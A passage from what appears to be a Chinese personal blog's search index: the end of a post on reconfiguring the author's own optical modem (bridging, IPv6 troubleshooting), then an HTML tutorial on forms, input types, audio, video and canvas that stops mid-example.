不过也有解决方案的，就是把网线连接到无线路由器的LAN口而不是WAN口，关闭它的 DHCP 功能，由光猫直接分配 IP 地址就行了。 然而有个大问题，就是我的 IPv6 没有Internet访问权限。手动配置了DNS也不行。 ping -6 ipv6.baidu.com通不了。 tracert 240c::6666 发现到我的光猫就出不去了。 试了一下在光猫上的诊断里用IPv6进行ping也没有连接。 不知道哪里设置有问题了，很懵（摊手。 求大佬们指点一下。 0x05 宽带桥接改造前面说支持多播嘛，然后就想到利用光猫桥接宽带，然后再利用后面的路由器（软路由/硬路由）进行拨号。 或者是这种情况，网络流量较大，路由较复杂等光猫难以承受或者不够稳定，也可以试试桥接的方案。 方法类似于 0x04。 大概就像图里这样吧。 勾选启用Vlan，VLAN ID 也和之前配置INTERNET的一样。 绑定端口建议选端口1，毕竟是千兆口嘛！ 之后就可以直接通过 LAN1 连接路由器或者电脑进行拨号了。 拨号后也会分配公网的 IPv6 地址。（然而我这里的 IPv6 还是没有Internet访问权限，估计是运营商的问题吧 （假装这里有截图） 当然，要实现桥接改造，你还可以尝试直接修改配置文件的方案（超硬核），具体请参考这里。 0x06 其他玩意有次在访问一个光猫的页面时输错了网址，正好发现了光猫用的 HTTP Server 是 micro_httpd。 发现指向的网站还能访问。这是个轻量级的服务器了，正好也适合在这种小设备上跑了。 这个光猫还支持远程下载，可以通过 USB 连接外部设备，开启 FTP 服务器进行访问。 不过感觉这个 USB 应该也是2.0的，勉强用用还可以吧，也没尝试过233. 0x07 小结折腾了好久这个有点古老的光猫 emmm嘤嘤嘤 于是乎本文介绍的内容包括： 通过配置备份文件获取超级管理员密码，开启 Telnet 管理，启用 IPv6，宽带桥接的改造等等。 是时候换个路由器了，只有大概1/3的网速太亏了！ 怎么说好呢，感觉其实并没有干什么正事的亚子。。。 等我学完通信网络（计算机网络）说不定会有更深入的理解吧233333. 欢迎大佬们来交流交流呢！ 还有，以上内容仅供学习研究，请在合理合法范围内使用，禁止商用。 转载记得注明出处呀！ 溜了溜了（ ReferenceHG260GS-U光猫拆解与登录解码 北京联通光宽带及IPTV折腾笔记（二）–北京联通HG260GS-U WO-37开启超级管理员的方法 轻松开启中国移动IPV6连接，早入畅游ipv6世界 烽火HG220G-U 2.03+ / HG2201U 5.0+光猫改桥接教程 etc. （大部分都好古老了","path":"2020/02/27/Server_OpticalModem/"},{"title":"FrontEnd | HTML 进阶学习笔记","text":"前言前几天过了一遍基础的 HTML 知识，记了点笔记在这里。 总体感觉 HTML 果然是一门标记语言，其实它就是将要展示给用户的各种元素利用带有 &lt; &gt; 的标签标记好，浏览器再根据不同的标签渲染出不同的效果，呈现给用户。 HTML 可以说是搭了一个框架，而 CSS 则是把网页加以打扮，使其变得美观，JavaScript 则提供和拓展了网站与用户之间的交互功能。 这回就来学一学HTML中进阶的内容吧。（其实也不算进阶8 继续主要参考 W3School 的教程吧，也结合一点自己的小体会。 由于博客自带了一些 CSS 样式，可能有些显示效果有所不同。 表单简介用于收集用户的输入。 form 元素&lt;form&gt; 元素用来定义 HTML 表单。 框架是这样 &lt;form&gt; &lt;!-- ... form elements（表单元素） ... --&gt; &lt;/form&gt; Action 属性action 属性定义在提交表单时执行的动作。向服务器提交表单的通常做法是使用提交按钮（后面再说）。 利用 action 指定将信息发送到服务器的路径。 比如指定 miao.php 这个PHP脚本来处理提交的数据： &lt;form action=\"miao.php\"&gt; RESTful API 的话，通常是指定某个路径，如 /api/user，通过 HTTP 的不同方法进行相应的处理。 如果省略 action 属性，则 action 会被设置为当前页面。 Method 属性method 属性规定在提交表单时所用的 HTTP 方法（GET 或 POST）。 省略的话默认为 GET 方法。 &lt;form action=\"miao.php\" method=\"GET\"&gt; &lt;form action=\"miao.php\" method=\"POST\"&gt; GET 适合少量数据的提交（浏览器和服务器对URL长度有限制），数据会以 urlencode 的形式出现在 URL 的参数中，适合非敏感信息。 POST 适合大量数据的提交，且更有安全性，数据在 body 中提交，不会出现在URL中，适合包含敏感信息（例如密码）等情况。 不过二者本质上没有明显的差别，其实是在标准制定上有所不同而已。 Name 属性如果要正确地被提交，每个输入字段必须设置一个 name 属性。 若不含name属性，则不会向服务器提交这一项内容。 &lt;form action=\"#\"&gt; First name:&lt;br&gt; &lt;input type=\"text\" value=\"Mickey\"&gt; &lt;br&gt; Last name:&lt;br&gt; &lt;input type=\"text\" name=\"lastname\" value=\"Mouse\"&gt; &lt;br&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt; First name: Last name: （这个提交不会有反应的啦 form 元素的完整属性&lt;form action=\"action_page.php\" method=\"GET\" target=\"_blank\" accept-charset=\"UTF-8\" ectype=\"application/x-www-form-urlencoded\" autocomplete=\"off\" novalidate&gt; &lt;!-- ... form elements（表单元素） ... --&gt; &lt;/form&gt; 属性 描述 accept-charset 规定在被提交表单中使用的字符集（默认：页面字符集）。 action 规定向何处提交表单的地址（URL）（提交页面）。 autocomplete 规定浏览器应该自动完成表单（默认：开启on）。 enctype 规定被提交数据的编码（默认：url-encoded）。 method 规定在提交表单时所用的 HTTP 方法（默认：GET）。 name 规定识别表单的名称（对于 DOM 使用：document.forms.name）。 novalidate 规定浏览器不验证表单。 target 规定 action 属性中地址的目标（默认：_self）。 用 fieldset 组合表单数据&lt;fieldset&gt; 元素组合表单中的相关数据。 &lt;legend&gt; 元素为 &lt;fieldset&gt; 元素定义标题。 &lt;form action=\"#\"&gt; &lt;fieldset&gt; &lt;legend&gt;Personal information:&lt;/legend&gt; First name:&lt;br&gt; &lt;input type=\"text\" name=\"firstname\" value=\"Mickey\"&gt; &lt;br&gt; Last name:&lt;br&gt; &lt;input type=\"text\" name=\"lastname\" value=\"Mouse\"&gt; &lt;br&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;/fieldset&gt; &lt;/form&gt; 表单元素表单元素指的是不同类型的 input 元素、复选框、单选按钮、提交按钮等等。 input 元素最重要的表单元素。它有很多不同的 type 属性，比如： 类型type 描述 text 定义常规文本输入。 radio 定义单选按钮输入（选择多个选择之一） submit 定义提交按钮（提交表单） …… …… 文本输入text、密码输入password&lt;input type=\"text\"&gt; 定义用于文本输入的单行输入字段。 &lt;input type=\"password\"&gt; 定义密码字段。 表单本身并不可见。文本字段的默认宽度是 20 个字符。 &lt;form&gt; Username:&lt;br&gt; &lt;input type=\"text\" name=\"username\"&gt; &lt;br&gt; Password:&lt;br&gt; &lt;input type=\"password\" name=\"password\"&gt; &lt;/form&gt; Username: Password: 上面这个密码，password 字段中的字符会被做掩码处理（显示为星号或实心圆）。 单选按钮输入 radio&lt;input type=\"radio\"&gt; 定义单选按钮。 单选按钮允许用户在有限数量的选项中选择其中之一。 注意：name属性要相同，否则可以点击不同选项。 &lt;form&gt; &lt;input type=\"radio\" name=\"sex\" value=\"male\" checked&gt;Male &lt;br&gt; &lt;input type=\"radio\" name=\"sex\" value=\"female\"&gt;Female &lt;/form&gt; Male Female 复选框输入 checkbox&lt;input type=\"checkbox\"&gt; 定义复选框。 可以在有限数量的选项中选择零个或多个选项。 &lt;form&gt; &lt;input type=\"checkbox\" name=\"animal\" value=\"cat\"&gt;cat &lt;br&gt; &lt;input type=\"checkbox\" name=\"animal\" value=\"dog\"&gt;dog &lt;/form&gt; cat dog （好像这个在博客里看不到效果i 提交按钮 submit&lt;input type=\"submit\"&gt; 定义用于向表单处理程序（form-handler）提交表单的按钮。 表单处理程序通常是包含用来处理输入数据的脚本的服务器页面，就是前面说的action属性指定的。 &lt;form action=\"#\"&gt; First name:&lt;br&gt; &lt;input type=\"text\" name=\"firstname\" value=\"Mickey\"&gt; &lt;br&gt; Last name:&lt;br&gt; &lt;input type=\"text\" name=\"lastname\" value=\"Mouse\"&gt; &lt;br&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt; First name: Last name: 按钮 button&lt;input type=\"button\"&gt; 定义按钮。 &lt;button type=\"button\" onclick=\"alert('Hello World!')\"&gt;Click Me!&lt;/button&gt; Click Me! 通过onclick等属性来指定该按钮的功能。 以下为HTML5中的新增的类型： color, date, datetime, datetime-local, email, month, number, range, search, tel, time, url, week 数字值的输入 number&lt;input type=\"number\"&gt; 用于应该包含数字值的输入字段。 &lt;form&gt; Quantity (between 1 and 5): &lt;input type=\"number\" name=\"quantity\" min=\"1\" max=\"5\"&gt; &lt;/form&gt; Quantity (between 1 and 5): 可以对输入进行限制，比如以下属性。 属性 描述 disabled 规定输入字段应该被禁用。 max 规定输入字段的最大值。 maxlength 规定输入字段的最大字符数。 min 规定输入字段的最小值。 pattern 规定通过其检查输入值的正则表达式。 readonly 规定输入字段为只读（无法修改）。 required 规定输入字段是必需的（必需填写）。 size 规定输入字段的宽度（以字符计）。 step 规定输入字段的合法数字间隔。 value 规定输入字段的默认值。 &lt;form&gt; Quantity: &lt;input type=\"number\" name=\"points\" min=\"0\" max=\"100\" step=\"10\" value=\"30\"&gt; &lt;/form&gt; Quantity: 有个坑，如果指定了step时，你指定的max属性的值不一定是可以取得到的呢。 比如min=1，max=100，step=10，则能取到的值为特定的1，11，21，…，91. 可以试一试。 Quantity: 日期输入 date下面的几个都是日期选择器（Date Pickers）： date - 选取日、月、年 month - 选取月、年 week - 选取周和年 time - 选取时间（小时和分钟） datetime - 选取时间、日、月、年（UTC 时间） datetime-local - 选取时间、日、月、年（本地时间） &lt;input type=\"date\"&gt; 用于应该包含日期的输入字段。 点击后会弹出一个日期选择框，提交之后的值格式类似于 day=2020-02-18。 &lt;form action=\"#\"&gt; 输入一个日期吧： &lt;input type=\"date\" name=\"day\"&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; 输入一个日期吧： 当然也可以添加限制啦。 &lt;form&gt; Enter a date before 1990-01-01: &lt;input type=\"date\" name=\"bday\" max=\"1989-12-31\"&gt;&lt;br&gt; Enter a date after 2020-01-01: &lt;input type=\"date\" name=\"bday\" min=\"2020-01-02\"&gt;&lt;br&gt; &lt;/form&gt; Enter a date before 1990-01-01: Enter a date after 2020-01-01: 月份输入 month&lt;input type=\"month\"&gt; 允许用户选择月份和年份。 这个在 Firefox 上不支持，Chrome 上是可以的。 &lt;form&gt; Birthday (month and year): &lt;input type=\"month\" name=\"bdaymonth\"&gt; &lt;/form&gt; Birthday (month and year): 周输入 week&lt;input type=\"week\"&gt; 允许用户选择周和年。 在 Firefox 上好像也不支持。 &lt;form&gt; Select a week: &lt;input type=\"week\" name=\"week_year\"&gt; &lt;/form&gt; Select a week: 无时区时间输入 time&lt;input type=\"time\"&gt; 选择时间（无时区）。 Firefox 也不支持。 &lt;form&gt; Select a time: &lt;input type=\"time\" name=\"usr_time\"&gt; &lt;/form&gt; Select a time: 有时区时间输入 datetime&lt;input type=\"datetime\"&gt; 选择时间（无时区）。 Chrome、Firefox 或 Internet Explorer 都不支持 type=”datetime”。 &lt;form&gt; Birthday (date and time): &lt;input type=\"datetime\" name=\"bdaytime\"&gt; &lt;/form&gt; Birthday (date and time): 无时区时间输入 datetime-local&lt;input type=\"datetime-local\"&gt; 选择日期和时间（无时区）。 Firefox 或者 Internet Explorer 不支持。Chrome 支持。 &lt;form action=\"#\"&gt; 输入一个具体时间（日期和时间）： &lt;input type=\"datetime-local\" name=\"bdaytime\"&gt; &lt;input type=\"submit\" value=\"Send\"&gt; &lt;/form&gt; 输入一个具体时间（日期和时间）： 颜色输入 color&lt;input type=\"color\"&gt; 用于应该包含颜色的输入字段。 点击会弹出颜色选择器。 &lt;form&gt; Select your favorite color: &lt;input type=\"color\" name=\"favcolor\"&gt; &lt;/form&gt; Select your favorite color: 提交的值类似于 favcolor=#ff1234（urlencode后为 favcolor=%23ff1234） 十六进制形式的颜色RGB形式。 范围输入 range&lt;input type=\"range\"&gt; 用于应该包含一定范围内的值的输入字段。 样式是一个滑块。 可以使用如下属性来规定限制：min、max、step、value。 &lt;form&gt; &lt;input type=\"range\" name=\"points\" min=\"0\" max=\"10\"&gt; &lt;/form&gt; 电子邮件地址输入 email&lt;input type=\"email\"&gt; 用于应该包含电子邮件地址的输入字段。 根据浏览器支持，能够在被提交时自动对电子邮件地址进行验证，也可以自己写一个pattern来做简单的有效性验证。 &lt;form&gt; E-mail: &lt;input type=\"email\" name=\"email\"&gt; &lt;/form&gt; E-mail: 搜索字段输入 search&lt;input type=\"search\"&gt; 用于搜索字段（搜索字段的表现类似常规文本字段）。 &lt;form&gt; Search Miao: &lt;input type=\"search\" name=\"miaosearch\"&gt; &lt;/form&gt; Search Miao: 电话号码的输入 tel&lt;input type=\"tel\"&gt; 用于应该包含电话号码的输入字段。 浏览器支持不是很好。 &lt;form&gt; Telephone: &lt;input type=\"tel\" name=\"usrtel\"&gt; &lt;/form&gt; Telephone: URL 地址输入 url&lt;input type=\"url\"&gt; 用于应该包含 URL 地址的输入字段。 根据浏览器支持，在提交时能够自动验证 url 字段。 &lt;form&gt; Add your website: &lt;input type=\"url\" name=\"website\"&gt; &lt;/form&gt; Add your website: 文件输入/上传 file&lt;input type=\"file\"&gt; 用于指定上传的文件。 input 元素的属性value指定输入字段的默认值。 &lt;form action=\"\"&gt; First name:&lt;br&gt; &lt;input type=\"text\" name=\"firstname\" value=\"Miao\"&gt; &lt;br&gt; Last name:&lt;br&gt; &lt;input type=\"text\" name=\"lastname\"&gt; &lt;/form&gt; First name: Last name: readonly只读，不可修改。但它也会作为参数提交给服务器。 readonly 属性不需要值。它等同于 readonly=”readonly”。 &lt;form action=\"\"&gt; &lt;input type=\"text\" name=\"firstname\" value=\"John\" readonly&gt; &lt;/form&gt; disableddisabled 属性规定输入字段是禁用的。 被禁用的元素是不可用和不可点击的。被禁用的元素不会被提交。 disabled 属性也不需要值。它等同于 disabled=”disabled”。 &lt;form action=\"\"&gt; &lt;input type=\"text\" name=\"firstname\" value=\"John\" disabled&gt; &lt;/form&gt; sizesize 属性规定输入字段的尺寸（以字符计）。 指的是输入框的长度。 &lt;form action=\"\"&gt; &lt;input type=\"text\" name=\"firstname\" value=\"John\" size=\"40\"&gt; &lt;/form&gt; maxlengthmaxlength 属性规定输入字段允许的最大长度。 一个汉字算作两个字符。 如设置 maxlength 属性，则输入控件不会接受超过所允许数的字符。 该属性不会提供任何反馈。如果需要提醒用户，则必须编写 JavaScript 代码。 注意，无论前端如何做提示，只要知道了提交的地址，照样可以构造一个请求进行提交。因此后端也要做好相应的输入限制判断。 &lt;form action=\"\"&gt; &lt;input type=\"text\" name=\"firstname\" value=\"John\" maxlength=\"10\"&gt; &lt;/form&gt; 以下为H5中的新属性。 autocompleteautocomplete 属性规定表单或输入字段是否应该自动完成。 当自动完成开启，浏览器会基于用户之前的输入值自动填写值。默认是开启的。 可以把表单 form 中的 autocomplete 设置为 on，同时把特定的输入字段设置为 off，反之亦然。这样特定的输入就会优先它自己的设置。 autocomplete 属性适用于 &lt;form&gt; 以及如下 &lt;input&gt; 类型：text、search、url、tel、email、password、datepickers、range 以及 color。 &lt;form action=\"#\" autocomplete=\"on\"&gt; First name:&lt;input type=\"text\" name=\"fname\"&gt;&lt;br&gt; Last name: &lt;input type=\"text\" name=\"lname\"&gt;&lt;br&gt; E-mail: &lt;input type=\"email\" name=\"email\" autocomplete=\"off\"&gt;&lt;br&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; First name: Last name: E-mail: autofocusautofocus 属性是布尔属性。 如果设置，则规定当页面加载时 &lt;input&gt; 元素应该自动获得焦点。 就是光标自动出现在打了autofocus标签的位置，敲键盘就直接输入到相应的文本框里了。 &lt;form action=\"#\"&gt; First name: &lt;input type=\"text\" name=\"fname\" autofocus&gt;&lt;br&gt; Last name: &lt;input type=\"text\" name=\"lname\"&gt;&lt;br&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; height &amp; width规定 &lt;input&gt; 元素的高度和宽度。 height 和 width 属性仅用于 &lt;input type=\"image\"&gt;。 &lt;input type=\"image\" src=\"img_submit.gif\" alt=\"Submit\" width=\"48\" height=\"48\"&gt; image 输入类型默认会发生点击图像按钮时的 X 和 Y 坐标。 min &amp; max规定 &lt;input&gt; 元素的最小值和最大值。 适用的类型：number、range、date、datetime、datetime-local、month、time 以及 week。 step规定 &lt;input&gt; 元素的合法数字间隔。 示例：如果 step=”3”，则合法数字应该是 -3、0、3、6、等等。 可与 max 以及 min 属性一同使用，来创建合法值的范围。 适用于以下输入类型：number、range、date、datetime、datetime-local、month、time 以及 week。 listlist 属性引用的 &lt;datalist&gt; 元素中包含了 &lt;input&gt; 元素的预定义选项。 &lt;input list=\"browsers\"&gt; &lt;datalist id=\"browsers\"&gt; &lt;option value=\"Internet Explorer\"&gt; &lt;option value=\"Firefox\"&gt; &lt;option value=\"Chrome\"&gt; &lt;option value=\"Opera\"&gt; &lt;option value=\"Safari\"&gt; &lt;/datalist&gt; multiple布尔属性。如果设置，则允许在 &lt;input&gt; 元素中输入一个以上的值。 适用的类型：email 和 file。 Select images: &lt;input type=\"file\" name=\"img\" multiple&gt; Select images: 上面这个就是允许上传多张图片。 formform 属性规定 &lt;input&gt; 元素所属的一个或多个表单。 如需引用一个以上的表单，请使用空格分隔的表单 id 列表。 输入字段位于 HTML 表单之外（但仍属表单）。 &lt;form action=\"#\" id=\"form1\"&gt; First name: &lt;input type=\"text\" name=\"fname\"&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt; Last name: &lt;input type=\"text\" name=\"lname\" form=\"form1\"&gt; 上面这里的lname同样会作为form1表单的一个参数提交给服务器。 formactionformaction 属性规定当提交表单时处理该输入控件的文件的 URL。 formaction 属性覆盖 &lt;form&gt; 元素的 action 属性。 适用于 type=”submit” 以及 type=”image”。 比如可以给单独一个按钮指定不同的提交路径。 &lt;form action=\"/example/html5/demo_form.asp\" method=\"get\"&gt; First name: &lt;input type=\"text\" name=\"fname\" /&gt;&lt;br /&gt; Last name: &lt;input type=\"text\" name=\"lname\" /&gt;&lt;br /&gt; &lt;input type=\"submit\" value=\"提交\" /&gt;&lt;br /&gt; &lt;input type=\"submit\" formaction=\"/example/html5/demo_admin.asp\" value=\"以管理员身份提交\" /&gt; &lt;/form&gt; formmethod定义用以向 action URL 发送表单数据（form-data）的 HTTP 方法。 formmethod 属性覆盖 &lt;form&gt; 元素的 method 属性。 适用于 type=”submit” 以及 type=”image”。 可以改变提交的方式。 &lt;form action=\"#\" method=\"get\"&gt; First name: &lt;input type=\"text\" name=\"fname\"&gt;&lt;br&gt; Last name: &lt;input type=\"text\" name=\"lname\"&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;input type=\"submit\" formmethod=\"post\" formaction=\"#\" value=\"Submit using POST\"&gt; &lt;/form&gt; formtarget规定的名称或关键词指示提交表单后在何处显示接收到的响应。 会覆盖 &lt;form&gt; 元素的 target 属性。可与 type=”submit” 和 type=”image” 使用。 比如指定某个按钮在新的页面打开。 &lt;form action=\"action_page.php\"&gt; First name: &lt;input type=\"text\" name=\"fname\"&gt;&lt;br&gt; Last name: &lt;input type=\"text\" name=\"lname\"&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"Submit as normal\"&gt; &lt;input type=\"submit\" formtarget=\"_blank\" value=\"Submit to a new window\"&gt; &lt;/form&gt; formenctype定当把表单数据（form-data）提交至服务器时如何对其进行编码（仅针对 method=”post” 的表单）。 覆盖 &lt;form&gt; 元素的 enctype 属性。 formnovalidate布尔属性。如果设置，则规定在提交表单时不对 &lt;input&gt; 元素进行验证。 覆盖 &lt;form&gt; 元素的 novalidate 属性。可用于 type=”submit”。 噗，终于看完 input 元素的属性了，真的多emmm 下面接着看其他的表单元素吧。 select 元素 下拉列表&lt;select&gt; 定义下拉列表，&lt;option&gt; 元素定义待选择的选项。 列表通常会把首个选项显示为被选选项。 可以通过添加 selected 属性来定义预定义选项。 &lt;select name=\"cars\"&gt; &lt;option value=\"volvo\"&gt;Volvo&lt;/option&gt; &lt;option value=\"saab\"&gt;Saab&lt;/option&gt; &lt;option value=\"fiat\" selected&gt;Fiat&lt;/option&gt; &lt;option value=\"audi\"&gt;Audi&lt;/option&gt; &lt;/select&gt; Volvo Saab Fiat Audi textarea 元素 文本域定义多行输入字段（文本域）。 &lt;textarea name=\"message\" rows=\"10\" cols=\"30\"&gt; The cat was playing in the garden. &lt;/textarea&gt; The cat was playing in the garden. 上面这里指定了默认情况下一行30个字符，一列10个字符。注意一行里一个汉字算作2个字符哒。 button 元素 按钮定义可点击的按钮。具体再指定相应的动作。 这个和 &lt;input type=\"button\"&gt; 效果类似。 &lt;button type=\"button\" onclick=\"alert('Hello World!')\"&gt;Click Me!&lt;/button&gt; Click Me! 下面是 HTML5 新增的元素 &lt;datalist&gt; &lt;keygen&gt; &lt;output&gt; 标签 描述 &lt;datalist&gt; 定义输入控件的预定义选项。 &lt;keygen&gt; 定义键对生成器字段（用于表单）。 &lt;output&gt; 定义计算结果。 datalist 元素 预定义选项列表规定预定义选项列表。 用户会在他们输入数据时看到预定义选项的下拉列表。 &lt;input&gt; 元素的 list 属性必须引用 &lt;datalist&gt; 元素的 id 属性。 &lt;input list=\"browsers\"&gt; &lt;datalist id=\"browsers\"&gt; &lt;option value=\"Internet Explorer\"&gt; &lt;option value=\"Firefox\"&gt; &lt;option value=\"Chrome\"&gt; &lt;option value=\"Opera\"&gt; &lt;option value=\"Safari\"&gt; &lt;/datalist&gt; 上面的input元素的属性里也提到了。 output 元素作为计算结果输出显示(比如执行脚本的输出)。 属性 值 描述 for element_id 描述计算中使用的元素与计算结果之间的关系。 form form_id 定义输入字段所属的一个或多个表单。 name name 定义对象的唯一名称（表单提交时使用）。 &lt;form oninput=\"x.value=parseInt(a.value)+parseInt(b.value)\"&gt;0 &lt;input type=\"range\" id=\"a\" value=\"50\"&gt;100 +&lt;input type=\"number\" id=\"b\" value=\"50\"&gt; =&lt;output name=\"x\" for=\"a b\"&gt;&lt;/output&gt; &lt;/form&gt; 0 100 + = H5 中的语义元素 标签 描述 &lt;article&gt; 定义文章。 &lt;aside&gt; 定义页面内容以外的内容。 &lt;details&gt; 定义用户能够查看或隐藏的额外细节。 &lt;figcaption&gt; 定义 &lt;figure&gt; 元素的标题。 &lt;figure&gt; 规定自包含内容，比如图示、图表、照片、代码清单等。 &lt;footer&gt; 定义文档或节的页脚。 &lt;header&gt; 规定文档或节的页眉。 &lt;main&gt; 规定文档的主内容。 &lt;mark&gt; 定义重要的或强调的文本。 &lt;nav&gt; 定义导航链接。 &lt;section&gt; 定义文档中的节。 &lt;summary&gt; 定义 &lt;details&gt; 元素的可见标题。 &lt;time&gt; 定义日期/时间。 多媒体Web 上的多媒体指的是音效、音乐、视频和动画等。 object 元素&lt;object&gt; 的作用是支持 HTML 助手（插件）。 辅助应用程序（helper application）是可由浏览器启动的程序，也称为插件。 辅助程序可用于播放音频和视频（以及其他）。辅助程序是使用 &lt;object&gt; 标签来加载的。 音频有这几种方案： 可以使用插件、使用&lt;embed&gt;元素、使用 &lt;object&gt; 元素、使用 HTML5 &lt;audio&gt; 元素等。 使用&lt;embed&gt;元素&lt;embed height=\"100\" width=\"100\" src=\"song.mp3\" /&gt; 使用 &lt;object&gt; 元素&lt;object height=\"100\" width=\"100\" data=\"song.mp3\"&gt;&lt;/object&gt; 使用 HTML5 &lt;audio&gt; 元素&lt;audio controls=\"controls\"&gt; &lt;source src=\"song.mp3\" type=\"audio/mp3\" /&gt; &lt;source src=\"song.ogg\" type=\"audio/ogg\" /&gt; Your browser does not support this audio format. &lt;/audio&gt; 这里定义了一个备选文件源，当.mp3 失效或浏览器不支持时，可以调用 .ogg 的文件。浏览器将使用第一个可识别的格式。 若浏览器不支持audio元素的话，则会显示 Your browser does not support this audio format. audio元素有如下的属性： 属性 值 描述 autoplay autoplay 如果出现该属性，则音频在就绪后马上播放。 controls controls 如果出现该属性，则向用户显示控件，比如播放按钮。 loop loop 如果出现该属性，则每当音频结束时重新开始播放。 preload preload 如果出现该属性，则音频在页面加载时进行加载，并预备播放。如果使用 “autoplay”，则忽略该属性。 src url 要播放的音频的 URL。 更好的方案&lt;audio&gt; 元素会尝试以 mp3 或 ogg 来播放音频。如果失败，代码将回退尝试 &lt;embed&gt; 元素。 &lt;audio controls=\"controls\" height=\"100\" width=\"100\"&gt; &lt;source src=\"song.mp3\" type=\"audio/mp3\" /&gt; &lt;source src=\"song.ogg\" type=\"audio/ogg\" /&gt; &lt;embed height=\"100\" width=\"100\" src=\"song.mp3\" /&gt; &lt;/audio&gt; 使用超链接实在不行，就直接用 a 链接标签吧。 点击该链接，浏览器会启动“辅助应用程序”来播放该文件。也可能会弹出文件下载界面。 &lt;a href=\"song.mp3\"&gt;Play the sound&lt;/a&gt; 视频和音频类似，也可以用&lt;embed&gt;元素、&lt;object&gt; 元素、HTML5 &lt;video&gt; 元素、超链接等。 只是把相应的源（src、data、href等）修改为视频地址即可。 使用 &lt;video&gt; 标签显示一段嵌入网页的 ogg、mp4 或 webm 格式的视频。 它有以下属性： 属性 值 描述 autoplay autoplay 如果出现该属性，则视频在就绪后马上播放。 controls controls 如果出现该属性，则向用户显示控件，比如播放按钮。 height pixels 设置视频播放器的高度。 loop loop 如果出现该属性，则当媒介文件完成播放后再次开始播放。 preload preload 如果出现该属性，则视频在页面加载时进行加载，并预备播放。如果使用 “autoplay”，则忽略该属性。 src url 要播放的视频的 URL。 width pixels 设置视频播放器的宽度。 &lt;video width=\"320\" height=\"240\" controls=\"controls\"&gt; &lt;source src=\"movie.mp4\" type=\"video/mp4\" /&gt; &lt;source src=\"movie.ogg\" type=\"video/ogg\" /&gt; &lt;source src=\"movie.webm\" type=\"video/webm\" /&gt; Your browser does not support the video tag. &lt;/video&gt; 可以使用 DOM 进行控制视频的播放、暂停以及加载等。 &lt;script type=\"text/javascript\"&gt; var myVideo=document.getElementById(\"video1\"); function playPause() { if (myVideo.paused) myVideo.play(); else myVideo.pause(); } function makeBig() { myVideo.width=560; } function makeSmall() { myVideo.width=320; } function makeNormal() { myVideo.width=420; } &lt;/script&gt; 更好的方案&lt;video width=\"320\" height=\"240\" controls=\"controls\"&gt; &lt;source src=\"movie.mp4\" type=\"video/mp4\" /&gt; &lt;source src=\"movie.ogg\" type=\"video/ogg\" /&gt; &lt;source src=\"movie.webm\" type=\"video/webm\" /&gt; &lt;object data=\"movie.mp4\" width=\"320\" height=\"240\"&gt; &lt;embed src=\"movie.swf\" width=\"320\" height=\"240\" /&gt; &lt;/object&gt; &lt;/video&gt; 使用了 4 种不同的视频格式。HTML 5 &lt;video&gt; 元素会尝试播放以 mp4、ogg 或 webm 格式中的一种来播放视频。如果均失败，则回退到 &lt;embed&gt; 元素。 当然，如果还不行，可以把视频上传到各大视频网站，然后嵌入视频就完事了。 CanvasHTML5 的 canvas 元素使用 JavaScript 在网页上绘制图像。 画布是一个矩形区域，您可以控制其每一像素。 canvas 拥有多种绘制路径、矩形、圆形、字符以及添加图像的方法。 创建 canvas&lt;canvas id=\"myCanvasTest\" width=\"200\" height=\"100\"&gt;&lt;/canvas&gt; canvas 元素本身是没有绘图能力的。所有的绘制工作必须在 JavaScript 内部完成。 比如绘制一个红色的矩形。 其中，getContext(\"2d\") 对象是内建的 HTML5 对象，拥有多种绘制路径、矩形、圆形、字符以及添加图像的方法。 &lt;script type=\"text/javascript\"&gt; var c=document.getElementById(\"myCanvasTest\"); var cxt=c.getContext(\"2d\"); cxt.fillStyle=\"#FF0000\"; cxt.fillRect(0,0,150,75); &lt;/script&gt; var c=document.getElementById(\"myCanvasTest\"); var cxt=c.getContext(\"2d\"); cxt.fillStyle=\"#FF0000\"; cxt.fillRect(0,0,150,75); 坐标左上角为 (0,0)，左到右为x轴正方向，上到下为y轴正方向，如下图所示。 这里有个示例↓。 function cnvs_getCoordinates(e) { x=e.clientX; y=e.clientY; document.getElementById(\"xycoordinates\").innerHTML=\"Coordinates: (\" + x + \",\" + y + \")\"; } function cnvs_clearCoordinates() { document.getElementById(\"xycoordinates\").innerHTML=\"\"; } 把鼠标悬停在下面的矩形上可以看到坐标： 绘制线条&lt;canvas id=\"myCanvas1\" width=\"200\" height=\"100\" style=\"border:1px solid #c3c3c3;\"&gt; Your browser does not support the canvas element. &lt;/canvas&gt; &lt;script type=\"text/javascript\"&gt; var c=document.getElementById(\"myCanvas1\"); var cxt=c.getContext(\"2d\"); cxt.moveTo(10,10); cxt.lineTo(150,50); cxt.lineTo(10,50); cxt.stroke(); &lt;/script&gt; Your browser does not support the canvas element. var c=document.getElementById(\"myCanvas\"); var cxt=c.getContext(\"2d\"); cxt.moveTo(10,10); cxt.lineTo(150,50); cxt.lineTo(10,50); cxt.stroke(); 绘制圆形&lt;canvas id=\"myCanvas2\" width=\"200\" height=\"100\" style=\"border:1px solid #c3c3c3;\"&gt; Your browser does not support the canvas element. &lt;/canvas&gt; &lt;script type=\"text/javascript\"&gt; var c=document.getElementById(\"myCanvas2\"); var cxt=c.getContext(\"2d\"); cxt.fillStyle=\"#FF0000\"; cxt.beginPath(); cxt.arc(70,18,15,0,Math.PI*2,true); cxt.closePath(); cxt.fill(); &lt;/script&gt; Your browser does not support the canvas element. var c=document.getElementById(\"myCanvas2\"); var cxt=c.getContext(\"2d\"); cxt.fillStyle=\"#FF0000\"; cxt.beginPath(); cxt.arc(70,18,15,0,Math.PI*2,true); cxt.closePath(); cxt.fill(); 绘制渐变背景&lt;canvas id=\"myCanvas3\" width=\"200\" height=\"100\" style=\"border:1px solid #c3c3c3;\"&gt; Your browser does not support the canvas element. &lt;/canvas&gt; &lt;script type=\"text/javascript\"&gt; var c=document.getElementById(\"myCanvas3\"); var cxt=c.getContext(\"2d\"); var grd=cxt.createLinearGradient(0,0,175,50); grd.addColorStop(0,\"#FF0000\"); 